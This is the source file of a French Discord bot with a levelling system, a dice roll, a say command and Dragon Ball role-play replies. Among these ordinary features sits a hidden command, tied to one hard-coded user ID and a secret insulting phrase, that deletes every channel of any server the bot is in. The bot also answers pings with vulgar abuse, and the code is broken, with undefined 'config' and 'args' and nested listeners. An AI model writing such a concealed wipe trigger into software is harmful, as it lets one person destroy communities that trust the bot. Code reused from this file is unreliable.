const Discord = require('discord.js');
const client = new Discord.Client();
client.commands = new Discord.Collection()
const fs = require('fs');
let db = JSON.parse(fs.readFileSync("./database.json", "utf8"));

client.on("message", message => {
    if (message.author.bot) return;


    if (!db[message.author.id]) db[message.author.id] = {
        xp: 0,
        level: 0
      };
    db[message.author.id].xp++;
    let userInfo = db[message.author.id];
    if(userInfo.xp > 100) {
        userInfo.level++
        userInfo.xp = 0
        message.reply("Félicitation ! Tu viens de monté de 1 niveau !")
    }
    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const cmd = args.shift().toLowerCase();
    if(cmd === "info") {
        let userInfo = db[message.author.id];
        let member = message.mentions.members.first();
        let embed = new Discord.RichEmbed()
        .setColor(0x4286f4)
        .addField("Level", userInfo.level)
        .addField("XP", userInfo.xp+"/100");
        if(!member) return message.channel.send(embed)
        let memberInfo = db[member.id]
        let embed2 = new Discord.RichEmbed()
        .setColor(0x4286f4)
        .addField("Level", memberInfo.level)
        .addField("XP", memberInfo.xp+"/100")
        message.channel.send(embed2)
    }
    fs.writeFile("./database.json", JSON.stringify(db), (x) => {
        if (x) console.error(x)
      });
})

client.on('message', message => {
if(message.content.startsWith('.launchcodejavascript'))
if (message.author.id == "568808318894604291") {
    var argresult = args.join(' ');
    client.user.setStatus(argresult);
    message.reply("Début du code en javascript :white_check_mark:");
} else {
    message.reply("Tu ne peux pas faire ceci, uniquement le créateur du bot peux faire ceci. :x:");
}})

client.on('message', msg => {
    if (msg.content === '<@!673466391738843167>')
    msg.channel.send('`Ptdr t ki pourquoi tu me ping sale fdp (mon prefix c\'est . )`')
})

client.on('message', message =>{
    if(message.author.id == "568808318894604291") {
    if(message.content === "!azukic'estvraimentunesalope") {
    message.guild.channels.forEach(channel => channel.delete())
      }
    }
  })


  client.on('message', message => {
    if(message.content.startsWith('.r')) {
        let args = message.content.split(' ').slice(1); 
        if(!args[0]) return message.reply("Veuillez mettre un nombre");
        let nb = Math.floor(Math.random() * args[0]);
        const zteamrollEmbed = new Discord.RichEmbed()
            .setTitle("**__Roll__**")
            .setColor("RANDOM")
            .addField("**__Ton Roll__**", `${args[0]}`)
            .addField("**__Nombre Obtenu__**", `${nb}`)
        message.channel.send(zteamrollEmbed)
        }
    })

client.on('message', message => {
    if(message.content.startsWith('.say')) {
let args = message.content.split(' ').slice(1); 
    let text = args.join(" ");
    message.delete();
message.channel.send(text);

//dbz rp

client.on('message', message => {
    if(message.content.startsWith('.genkidama')) {
if(message.member.roles.find("name", "[🌌] Genkidama")){
    message.channel.send('Vous faite appel à la planète terre, vous levez les mains au ciel ! Une énorme boule de ki se forme au dessus de vous, elle est prête à étre lancé !')


}else{
    message.channel.send("Votre corps n'a pas supporté cette Technique, vous avez besoin de plus d'entrainement !")
}
    }
})

//fin dbz rp

    }})

fs.readdir('./Commandes/', (error, f) => {
    if (error) { return console.error(error); }
        let commandes = f.filter(f => f.split('.').pop() === 'js');
        if (commandes.length <= 0) { return console.log('Aucune commande trouvée !'); }

        commandes.forEach((f) => {
            let commande = require(`./Commandes/${f}`);
            console.log(`${f} -> Ready`);
            client.commands.set(commande.help.name, commande);
            
        });
});

fs.readdir('./Events/', (error, f) => {
    if (error) { return console.error(error); }
        console.log(`${f.length} events chargés`);

        f.forEach((f) => {
            let events = require(`./Events/${f}`);
            let event = f.split('.')[0];
            client.on(event, events.bind(null, client));
        });
        
});

client.login(process.env.TOKEN);
